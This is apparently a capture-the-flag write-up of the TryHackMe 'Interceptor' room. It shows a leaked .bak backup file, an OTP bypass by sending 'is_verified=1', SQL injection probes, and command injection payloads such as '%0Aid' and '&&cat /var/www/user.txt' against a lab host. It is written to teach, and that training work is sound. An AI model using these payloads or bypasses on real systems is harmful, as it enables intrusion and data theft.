---
description: "TryHackMe Interceptor — MediaHub is a PHP portal hidden behind a login and a 2FA/OTP verification step. A leftover login.php.bak backup leaks the admin email and the password policy (\"MediaHub + any year\"). The OTP is bypassed by a mass-assignment flaw: the failure JSON leaks a field name, is_verified, and sending that field as a request parameter marks the session verified. As admin, an \"Import Feed\" tool runs curl on a URL server-side; the dangerous-character filter is client-side only, so hitting the API directly gives command injection and the second flag. Every request and every flag explained, with the controls that prove each step."
---

# Interceptor — reading the traffic your browser hides from you

**TryHackMe · challenge: Interceptor · target: `10.x.x.x` (the lab IP changes per lease)**

> **Both flags are redacted** here as `THM{[redacted]}`. Everything that teaches stays: every
> request, every parameter, the exact bypass field, the injection payload, and the controls that
> prove each result. The flag strings themselves teach nothing — they are just proof you were
> there, and printing them hands the room's answer to the next person.

**The brief.** MediaHub is *"an internal portal used by journalists to manage content. Everything
seems protected behind a login and verification system, but the real story lies in how the
application communicates with its backend APIs."* We are told to fire up a **proxy**, watch the
requests the browser sends, work out how the server processes them, and **modify the data** — *"a
small change in the request might be all it takes to bypass the intended controls."*

That last sentence is the whole room. Nothing here is a memory-corruption exploit or a password
brute force. It is three separate places where the server **trusts something the client sends**, and
each one falls to changing a single value in a request. A "proxy" here means a tool like **Burp
Suite** or **ZAP** that sits between your browser and the website so you can pause a request, edit
it, and let it continue. Everything below I did with `curl`-style HTTP calls from the command line,
which is the same thing without the graphical interface.

Two questions:

1. What is the flag shown after logging in as **admin**?
2. What is the value of **`/var/www/user.txt`** on the server?

---

## 1. Recon — what is even running?

### Port scan

A **port** is a numbered door on a machine; each network service listens on its own. We ask which
doors are open with **nmap**, the standard port scanner.

```bash
nmap -Pn -T4 --min-rate 1000 -p- -oN nmap-allports.txt 10.x.x.x
```

- `-Pn` — "don't ping first, assume the host is up." Lab firewalls often drop pings, which would
  make nmap skip the host entirely.
- `-T4` — timing template 4, "aggressive." Faster, fine for a lab box.
- `--min-rate 1000` — send at least 1000 packets per second, so a full scan finishes in seconds.
- `-p-` — scan **all 65535 ports**, not just the common 1000. A hidden service on a high port is
  exactly the kind of thing a default scan misses.
- `-oN nmap-allports.txt` — save the output ("normal" format) to a file, so the evidence survives.

Three doors are open:

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu)
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
```

- **22 = SSH**, remote login. Nothing to do here yet — we have no credentials.
- **53 = DNS**, the name server. Worth a quick look for leaks, but it turned out to be a dead end
  (no zone transfer, `hostname.bind` just says `interceptor`).
- **80 = HTTP**, the website. This is the target.

### Fingerprint the web app

```bash
curl -sS -i http://10.x.x.x/
```

- `-sS` — silent, but still show errors (`-s` alone also hides error messages, which has burned me
  before — a request that never left the machine looks identical to one that returned nothing).
- `-i` — include the response headers, not just the body.

The response sets a `PHPSESSID` cookie, so this is a **PHP** application using server-side sessions.
A **session** is how a website remembers you're logged in: the server keeps your state in memory and
hands your browser a random cookie (`PHPSESSID`) that points back to it. The important consequence,
which matters later: you can't just forge "I am logged in" by editing a cookie value, because the
truth lives on the server, not in the cookie.

The landing page is a thin MediaHub splash with a **Login** link. The login page (`login.php`) is
where the interesting behaviour starts.

---

## 2. Reading the client-side code — the API is documented for you

The single most valuable habit on a web target: **read the JavaScript first.** The browser has to
know which URL to call, what fields to send, and what method to use — so the code that does it is
sitting right there in the page. Viewing the source of `login.php`:

```html
<form id="loginForm">
  <input name="email" ...>
  <input name="password" type="password" ...>
</form>

<script>
form.addEventListener("submit", async (e) => {
  const payload = new FormData(form);
  const res = await fetch("api_login.php", { method: "POST", body: payload });
  const data = await res.json();
  if (!data.ok) { /* show data.error */ return; }
  setTimeout(() => window.location = data.redirect, 400);
});
</script>
```

In plain words: the login form does **not** submit itself the old-fashioned way. JavaScript
intercepts the submit, bundles `email` and `password`, and POSTs them to **`api_login.php`**. The
server answers with **JSON** — a small structured reply like `{"ok":true,"redirect":"otp.php"}`. If
`ok` is false it shows `data.error`; if true it sends the browser to `data.redirect`.

That is the whole "backend API" the brief keeps mentioning. Let me talk to it directly.

### Establishing a control

Before believing any result, I send a request I **know** should fail, so I learn what "no" looks
like (a **control**):

```bash
curl -sS -X POST http://10.x.x.x/api_login.php -d 'email=x@y.z&password=wrong'
# {"ok":false,"error":"Invalid credentials."}

curl -sS -X POST http://10.x.x.x/api_login.php
# {"ok":false,"error":"Email and password are required."}
```

Now I know the two failure messages. Anything different from these is a signal.

### The dead ends worth showing (they're the lesson)

I spent real time here before finding the way in, and the failed attempts are the teaching:

- **SQL injection.** SQL injection is when you smuggle database syntax into an input to trick the
  query. I tried the classic bypasses — `email=' OR 1=1-- -`, a lone `'`, arrays — and every one
  returned the *same* `"Invalid credentials."` as my control. A **time-based** test settles it for
  certain: `email=' OR SLEEP(3)-- -` asks the database to pause 3 seconds if the injection lands. It
  returned in 0.11 s, same as everything else. **No injection** — the login uses safe, parameterised
  queries.
- **Guessing credentials.** No email produced a different error, so there's no way to tell a real
  account from a fake one, and blind password guessing is the worst move on the effort-vs-information
  scale. I stopped.
- **Extra parameters.** I tried adding `role=admin`, `is_admin=1`, `bypass=1` to the login — no
  change. (Hold that thought; the *idea* is right, I was just aiming it at the wrong endpoint.)

### The catch-all that lies to you

I also tried guessing filenames — `register.php`, `admin.php`, `api_admin.php`. **Every single one
returned "200 OK" with exactly 1491 bytes.** That looks like everything exists. It's a trap: the
server is configured to serve the landing page for *any* path it doesn't recognise. So a "200" here
means nothing — 1491 bytes **is** the "not found" page.

The fix is to make the tool filter that out and to give it a **positive control** — something I know
exists — so I can confirm the tool actually works:

```bash
ffuf -u "http://10.x.x.x/FUZZ" -w raft-medium-files.txt -mc all -fs 1491 -t 25
```

- `ffuf` — a fast web fuzzer; it requests every word in a list in place of `FUZZ`.
- `-w raft-medium-files.txt` — the wordlist of candidate filenames.
- `-mc all` — match all status codes (don't pre-filter; I'll filter by size instead).
- `-fs 1491` — **filter out** responses of size 1491, i.e. hide the catch-all page.
- `-t 25` — 25 threads. Kept modest; hammering a 1-vCPU lab box just makes it fall over.

`login.php` shows up (my positive control — good, the tool works), and so do real files the guessing
never found: `config.php`, `header.php`, `footer.php`, `search.php`, `logout.php`, and — the one
that cracks the room open — **`login.php.bak`**.

---

## 3. A leftover backup hands over the credentials

`.bak` is a backup file. Developers rename `login.php` to `login.php.bak` while editing, and forget
it in the web root. The web server doesn't run `.bak` as PHP — it serves it as **plain text**, so
the source code, comments and all, is readable:

```bash
curl -sS http://10.x.x.x/login.php.bak
```

Inside is a developer note that was never meant to ship:

```
| Admin test account for staging environment
| Email: admin@mediahub.thm
|
| Password policy reminder:
| Admin password follows company format:
| MediaHub + any year
|
| TODO: remove before production deployment
```

So the admin account is `admin@mediahub.thm`, and its password is the literal word `MediaHub`
followed by **some year**. That is not a brute force — it's a couple of dozen candidates
(`MediaHub2020`, `MediaHub2021`, …), each a single request. A quick sweep of recent years lands on:

```bash
curl -sS -X POST http://10.x.x.x/api_login.php \
     -d 'email=admin@mediahub.thm&password=MediaHub2026'
# {"ok":true,"message":"Login success. OTP required.","redirect":"otp.php"}
```

**`MediaHub2026`.** The credentials work — but notice the reply: *"OTP required."* We're logged in,
and immediately stopped by the **verification system**.

> **Lesson.** I chased SQL injection first, which was reasonable but empty. The move that actually
> paid was the cheapest one on the board: check for a leftover backup file. Source disclosure handed
> over both the account and the shape of the whole app in one request.

---

## 4. The verification system — and the field name it hands you

**OTP** stands for **One-Time Password** — the 6-digit code that many sites text or email you as a
second login step ("2FA", two-factor authentication). The `otp.php` page posts your 6 digits to
**`verify_otp.php`**, again as JSON.

There's no email or phone in this lab, so we can't receive a real code. But we don't need to. Watch
what a **wrong** guess returns:

```bash
curl -sS -X POST http://10.x.x.x/verify_otp.php -d 'otp=000000' -b session.cookie
# {"ok":false,"error":"Invalid OTP. Try again.","is_verified":false}
```

Read the whole response, not just `ok`. The server volunteered a field it didn't have to:
**`is_verified`**. That is the internal name of the flag the server uses to decide whether your
session has passed 2FA. The application is showing you the lever it uses to lock the door.

So try pulling that exact lever — send `is_verified` as a **request** parameter:

```bash
curl -sS -X POST http://10.x.x.x/verify_otp.php -d 'is_verified=1' -b session.cookie
# {"ok":true,"message":"OTP verified. Redirecting..."}
```

**Bypassed, with no OTP at all.** This is a **mass-assignment** flaw: the code blindly copies fields
from the request into the session (roughly `$_SESSION['is_verified'] = $_POST['is_verified']`),
instead of setting that flag itself only after checking a real code. We supplied the field, so we
supplied the answer.

The detail that makes this a *precise* finding, not a lucky guess: `verified=1`, `bypass=1` and
`otp[]=` all still failed. Only the **exact field name from the response** worked. The failure JSON
wasn't just noise — it named the parameter that unlocks the account. (This is why my earlier
"extra parameter" idea failed on the login: right technique, wrong endpoint and wrong field name.
The server tells you the field; you don't guess it.)

With that same session, the dashboard now loads as admin:

```bash
curl -sS http://10.x.x.x/dashboard.php -b session.cookie
```

The profile reads **Role: admin · Verified: Yes**, and the first flag is printed right on the page
(in a banner and in a tooltip):

> ### Answer 1 — flag after logging in as admin
>
> ```
> THM{[redacted]}
> ```
>
> The word-shape matches the room's mask `***{*****_******_*****_****}`, and it spells out the
> method: admin access, using a proxy.

---

## 5. From admin to reading files — the filter that only guards the browser

The admin dashboard has an **Import Feed** tool. You paste a feed URL, *"the server fetches it and
returns the raw output."* The page's JavaScript posts your `url` to `import_feed_api.php` and shows
a field called **`cmd_output`** — a strong hint that the server runs a **command** (a `curl` on your
URL) and hands back whatever it printed.

Running a shell command built from user input is the classic setup for **command injection** —
making the server run *your* command by sneaking shell syntax into the input. The developers clearly
worried about this, because the JavaScript scrubs the dangerous characters:

```js
const url = url1.replace(/[;&|]/g, '');   // strip ; & |
```

But look **where** that runs: in your browser, before the request is sent. It protects nobody. A
proxy — or just calling the API directly — never runs that line. **Client-side validation is a
suggestion, not a security control.** This is the room's whole thesis stated one more time.

### Finding a payload that fires

First, what does the server reject? Two controls:

```bash
# a private address -> blocked (there is a server-side SSRF filter)
curl ... -d 'url=http://127.0.0.1/'      # {"error":"Private network access blocked"}
# something that isn't a URL -> rejected
curl ... -d 'url=test'                    # {"error":"Invalid URL"}
```

So the URL must start with `http://` and point at a **public** host to get past the filter. That's
fine — the injection rides *after* a valid-looking URL. I sent a small battery of shell operators
appended to a public host and watched `cmd_output`:

```bash
# url = http://example.com/<INJECTION>id
```

Most operators did nothing here, but two fired cleanly — a **newline** (`%0A`, URL-encoded) and
`&&`:

```bash
curl -sS -X POST http://10.x.x.x/import_feed_api.php -b session.cookie \
     --data-urlencode 'url=http://example.com/%0Aid'
# {"ok":true,"cmd_output":"uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(findgroup),1003(websql)\n"}
```

`id` is a Unix command that prints who you are. `uid=33(www-data)` means our command ran on the
server as the **www-data** user (the account the web server runs as). That's arbitrary command
execution. `--data-urlencode` tells curl to safely encode the payload (so `%0A` really becomes a
newline in transit).

### Reading the file

The second question asks for `/var/www/user.txt`. `cat` prints a file's contents:

```bash
curl -sS -X POST http://10.x.x.x/import_feed_api.php -b session.cookie \
     --data-urlencode 'url=http://example.com/&&cat /var/www/user.txt'
# {"ok":true,"cmd_output":"THM{[redacted]}\n"}
```

> ### Answer 2 — contents of `/var/www/user.txt`
>
> ```
> THM{[redacted]}
> ```
>
> Word-shape matches the mask `***{******_*****_************}` — "system pwned successfully."

A quick `ls -la /var/www/` through the same channel confirms the file (`-rw-rw-rw- root root 31
bytes user.txt`) and that we're on host `interceptor` as `www-data`. The `www-data` account is in
two extra groups (`findgroup`, `websql`) — a clear breadcrumb toward privilege escalation if the
room continued, but the two flags are already in hand.

---

## The chain, in one breath

1. **Recon** — port 80 is a PHP app whose login talks to a JSON API (`api_login.php`). Read the
   JavaScript; it documents the API for you.
2. **Enumeration** — the server's catch-all makes every guessed path look like a hit; fuzz with a
   size filter and a positive control instead. That finds `login.php.bak`.
3. **Source disclosure** — the backup leaks the admin email and the "`MediaHub` + year" password
   policy. A tiny year sweep logs in.
4. **Auth-logic bypass (mass assignment)** — the OTP failure response leaks the field name
   `is_verified`; sending that exact field as a parameter marks the session verified with no code.
   → **admin flag.**
5. **Command injection** — the admin "Import Feed" tool runs `curl` server-side and the only
   character filter is client-side; a newline or `&&` after a public URL runs any command.
   → read `/var/www/user.txt`.

Every link is the same bug wearing a different costume: **the server trusts data the client
controls.** That is exactly what the brief promised, and exactly what a proxy is for — the moment
you can see and edit the request, all three controls are one small change away from open.

## The recurring lessons

- **Read the whole response, not just the status.** The bypass field name (`is_verified`) was
  volunteered inside a *failure* message. If I'd only looked at `ok:false`, I'd have gone hunting for
  a real OTP that doesn't exist.
- **A "200 OK" can be a lie.** A catch-all that serves the homepage for unknown paths turns every
  guess into a false hit. Filter it out and always fuzz with a control you know exists.
- **Client-side validation protects nothing.** The `;&|` filter lived in the browser. The proxy —
  the entire point of this room — walks straight past it.
- **The cheap check beats the clever one.** I burned time on SQL injection; a leftover `.bak` file
  handed over the credentials and the app's whole shape in a single request.

## Cleanup

Nothing was left on the box. The command injection only **read** files — no shell was uploaded, no
SSH key added, no file overwritten, so there was nothing to remove. The scans finished on their own
and no background job was left running.
